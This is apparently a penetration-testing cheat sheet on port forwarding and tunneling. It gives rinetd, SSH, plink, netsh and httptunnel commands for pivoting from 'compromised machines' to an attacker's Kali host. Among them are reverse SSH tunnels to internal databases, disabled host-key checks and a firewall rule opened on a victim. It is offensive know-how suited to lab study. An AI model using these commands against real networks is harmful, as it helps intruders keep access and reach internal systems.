# Port Forwarding
## [rinetd](https://github.com/samhocevar/rinetd)
It is used for redirect any traffic received to an specific port
- In its config file we have to specify the bindaddress, bindport, connectaddress and connectport:
  ```bash
  kali@kali:~$ cat /etc/rinetd.conf
  ...
  # bindadress bindport connectaddress connectport
  0.0.0.0 80 216.58.207.142 80
  ...
  
  kali@kali:~$ sudo service rinetd restart
  ```
## SSH Local Port Forwarding
### Linux
```bash
kali@kali:~$ sudo ssh -N -L 0.0.0.0:1337:10.0.0.2:80 root@10.0.0.1
```
![image](https://user-images.githubusercontent.com/43812413/199309514-9603a925-3358-4fee-b289-955c892f04ed.png)

## SSH Remote Port Forwarding
### Linux
```bash
user1@debian:~$ ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
```

```bash
ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" kali@10.11.0.4
```

#### SSH wothout password
```bash
# Compromised machine
mkdir keys
cd keys
ssh-keygen

#Kali
nano ~/.ssh/authorized_keys 
from="COMPRIMISED-IP",command="echo 'This account can only be used for port forwarding'", no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMfLhjaHyhUr4auF+hSnF2g1hN4N2Z4DjkfZ9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8ZIo/ENC68Py+NhtW1c2So95ARwCa/Hkb7kZ1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T5/wJNcn8i12Lex/d02iOWCLGEav2V1R9xk87xVdI6h5BPySl35+ZXOrzazbddS7MwGFz16coo+wbHbTR6P5fF9Z1Zm9O/US2LoqHxs7OxNq61BLtr4I/MDnin www-data@ubuntu

ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
```
### Windows
#### plink
```bash
 cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
 ```


## SSH Dynamic Port Forwarding
- With the **-D** flag we can set a SOCKS4/5 application proxy
  ```
  kali@kali:~$ sudo ssh -N -D 127.0.0.1:8080 user1@10.11.0.128

  kali@kali:~$ cat /etc/proxychains.conf
  ...
  [ProxyList]
  # add proxy here ...
  # meanwile
  # defaults set to "tor"
  socks5 127.0.0.1 8080
  ```

- With the **-R** option, by not including a host after the port, ssh is instructed to create a SOCKS proxy on our Kali Server
  ```bash
  ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/.ssh/id_rsa kali@10.11.0.4
  ```
  

## NETSH Port Forwarding
- Installed by default on every modern version of Windows
- Windows system must have the *IP Helper* running and *IPv6* supports must be enabled.
```bash
C:\Windows\system32> netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
```
- If theres is some rule in the Firewall that blocks the incoming connections to the specified port
```bash
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
``````

# Tunneling
## httptunnel
- It is used when only HTTP traffic is allowed. If we have a compromised machines we can:
  1. Set-up a SSH Port Forwarding in the target machine, that forwards the traffic to another machine in its private network
    ```bash
    www-data@debian:/$ ssh -L 0.0.0.0:8888:192.168.1.110:3389 user1@127.0.0.1
    ```
  2. Set-up a HTTP Tunnel between our machine and the compromised one (the compromised one will re-forward the traffic to the port configured in the port forwarding)
    ```bash
    # at the compromised machine
    user1@debian:~$ hts --forward-port localhost:8888 1234
    
    # at our Kali
    htc --forward-port 8080 10.11.0.128:1234
    ```
    

